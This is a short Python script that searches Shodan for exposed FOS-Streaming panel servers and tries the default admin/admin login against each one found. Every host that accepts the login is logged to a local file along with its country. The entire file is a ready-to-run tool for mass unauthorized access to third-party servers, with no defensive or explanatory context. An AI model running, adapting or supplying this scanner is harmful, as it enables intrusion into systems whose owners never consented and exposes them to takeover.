#!/usr/bin/env python
#
# fos.py
# Search SHODAN for Fos Streaming Servers with default logins.
#
# Author: random_robbie

import shodan
import json
import requests
import sys

# Configuration
API_KEY = "YOURSHODANAPIKEY"
SEARCH_FOR = 'title:"FOS-Streaming panel by Tyfix"'

session = requests.Session()

def login (IP,PORT,CC):
	try:
		paramsPost = {"password":"admin","submit":"Log in","username":"admin"}
		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Referer":"http://"+IP+":"+PORT+"/","Connection":"close","Accept-Language":"en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}
		cookies = {"PHPSESSID":"sfkdjljkhsdfjhks"}
		response = session.post("http://"+IP+":"+PORT+"/", data=paramsPost, headers=headers, cookies=cookies)
		if response.status_code == 302:
			print ("[*]Found Working FOS Streamer ... Logging to file.[*]")
			login = "http://"+IP+":"+PORT+"/ -- Country: "+CC+""
			text_file = open("fos.txt", "a")
			text_file.write(""+login+"\n")
			text_file.close()
		else:
			print ("[*]Unable to login[*]")
	except Exception as e:
		print('Error: %s' % e)



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = str(service['ip_str'])
				PORT = str(service['port'])
				CC = service['location']['country_name']
				login (IP,PORT,CC)

				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)